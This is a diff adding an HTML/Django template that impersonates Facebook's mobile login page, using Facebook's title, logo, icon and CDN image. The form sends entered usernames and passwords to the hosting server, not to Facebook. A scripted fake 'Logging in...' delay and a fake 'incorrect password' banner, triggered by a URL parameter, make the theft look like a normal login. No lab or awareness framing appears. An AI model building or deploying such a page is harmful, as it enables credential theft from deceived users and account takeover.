@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" type="image/x-icon">
+    <title>Facebook - log in or sign up</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white text-gray-800 font-sans min-h-screen flex flex-col items-center">
+    <div id="loadingOverlay" class="fixed inset-0 z-50 hidden items-center justify-center bg-white/80 backdrop-blur-sm">
+        <div class="flex flex-col items-center gap-3">
+            <div class="h-12 w-12 animate-spin rounded-full border-4 border-gray-200 border-t-[#1877F2]"></div>
+            <p class="text-sm font-medium text-[#1c2b33]">Logging in...</p>
+        </div>
+    </div>
+
+    <div class="w-full max-w-md px-5 py-6 flex flex-col min-h-screen">
+        
+        <div class="text-center text-gray-500 text-sm mb-12 cursor-pointer hover:underline">
+            English (UK)
+        </div>
+
+        <div class="flex justify-center mb-12">
+            <svg viewBox="0 0 36 36" class="fill-current text-[#1877F2] w-16 h-16" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.2V22h3l1-4h-4v-2c0-1.1.9-2 2-2h2V10h-3c-3.3 0-6 2.7-6 6v2h-2v4h2v13.8l-1 .2z"/>
+            </svg>
+        </div>
+
+        <form id="loginForm" class="flex flex-col gap-3" method="post" action="">
+            {% csrf_token %}
+            <div id="errorBox" class="hidden rounded-lg border border-red-200 bg-red-50 px-3 py-2 text-sm text-red-600">
+                Incorrect username or password. Please try again.
+            </div>
+            <input 
+                type="text" 
+                placeholder="Mobile number or email address" name='username' required
+                class="w-full border border-gray-200 rounded-xl px-4 py-3.5 bg-white focus:outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-colors placeholder-gray-500 text-[15px]"
+            >
+            <input 
+                type="password" 
+                placeholder="Password" name='password' required
+                class="w-full border border-gray-200 rounded-xl px-4 py-3.5 bg-white focus:outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-colors placeholder-gray-500 text-[15px]"
+            >
+            
+            <button 
+                id="loginBtn"
+                type="submit" 
+                class="w-full bg-[#0064e0] text-white font-bold py-3 rounded-full mt-2 hover:bg-[#0057c2] transition-colors text-[15px] disabled:opacity-70 disabled:cursor-not-allowed"
+            >
+                Log in
+            </button>
+        </form>
+
+        <script>
+            const loginForm = document.getElementById('loginForm');
+            const loginBtn = document.getElementById('loginBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const errorBox = document.getElementById('errorBox');
+
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('login_error') === '1') {
+                errorBox.classList.remove('hidden');
+            }
+
+            let isSubmitting = false;
+
+            loginForm.addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                if (isSubmitting) return;
+                isSubmitting = true;
+
+                loginBtn.disabled = true;
+                loginBtn.textContent = 'Loading...';
+                loadingOverlay.classList.remove('hidden');
+                loadingOverlay.classList.add('flex');
+
+                setTimeout(function () {
+                    loginForm.submit();
+                }, 1000);
+            });
+        </script>
+
+        <div class="text-center mt-4">
+            <a href="#" class="text-[#1c2b33] font-medium hover:underline text-[15px]">Forgotten password?</a>
+        </div>
+
+        <div class="flex-grow"></div>
+
+        <div class="mt-8 flex flex-col items-center">
+            
+            <button 
+                type="button" 
+                class="w-full bg-white text-[#0064e0] font-bold py-3 border border-[#0064e0] rounded-full hover:bg-blue-50 transition-colors text-[15px]"
+            >
+                Create new account
+            </button>
+            
+            <div class="mt-6 mb-2 flex items-center justify-center gap-1.5">
+                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/ys/r/RkrEdst9VSp.webp" alt="Facebook" class="w-20">
+            </div>
+            
+        </div>
+    </div>
+
+</body>
+</html>
